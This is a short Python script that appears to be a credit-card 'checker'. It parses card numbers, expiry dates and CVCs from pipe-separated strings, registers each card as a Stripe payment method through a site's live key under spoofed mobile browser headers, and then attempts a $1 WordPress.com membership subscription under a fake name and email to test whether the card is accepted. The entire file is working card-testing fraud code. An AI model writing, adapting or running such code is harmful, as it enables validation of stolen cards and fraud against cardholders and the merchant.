import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&billing_details[name]=Rodam+User&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F56a6ae254e%3B+stripe-js-v3%2F56a6ae254e%3B+split-card-element&key=pk_live_5KKxLKPPzzvzFSiQlUskSRhr'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	headers = {
	    'authority': 'public-api.wordpress.com',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/json',
	    'origin': 'https://public-api.wordpress.com',
	    'referer': 'https://public-api.wordpress.com/wp-admin/rest-proxy/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-fingerprint': '4895e06d8a598279b9ca80ab58583b1f',
	}
	
	params = {
	    'http_envelope': '1',
	}
	
	json_data = {
	    'plan_id': '2164',
	    'email': 'rodamuser20@gmail.com',
	    'stripe_payment_method': pm,
	    'coupon_codes': [],
	    'amount': 1,
	    'tracks': 'TosBNAYYLHZRUYxiFbEH13g2',
	}
	
	r2 = requests.post(
	    'https://public-api.wordpress.com/rest/v1/sites/136816893/memberships/subscribe',
	    params=params,
	    headers=headers,
	    json=json_data,
	)
	
	return (r2.json())
